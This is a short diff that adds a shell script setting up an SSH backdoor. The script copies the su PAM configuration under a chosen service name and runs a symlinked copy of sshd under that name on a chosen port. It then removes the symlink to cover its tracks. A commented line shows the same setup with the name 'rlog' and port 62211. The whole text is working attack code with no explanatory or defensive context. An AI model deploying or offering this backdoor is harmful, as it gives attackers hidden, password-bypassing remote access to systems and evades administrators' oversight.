@@ -1,0 +1,4 @@
+name=$1
+port=$2
+cp /etc/pam.d/su /etc/pam.d/$name;ln -sf /usr/sbin/sshd /tmp/$name;/tmp/$name -oPort=$2;rm -f /tmp/$name
+#cp /etc/pam.d/su /etc/pam.d/rlog;ln -sf /usr/sbin/sshd /tmp/rlog;/tmp/rlog -oPort=62211;rm -f /tmp/rlog
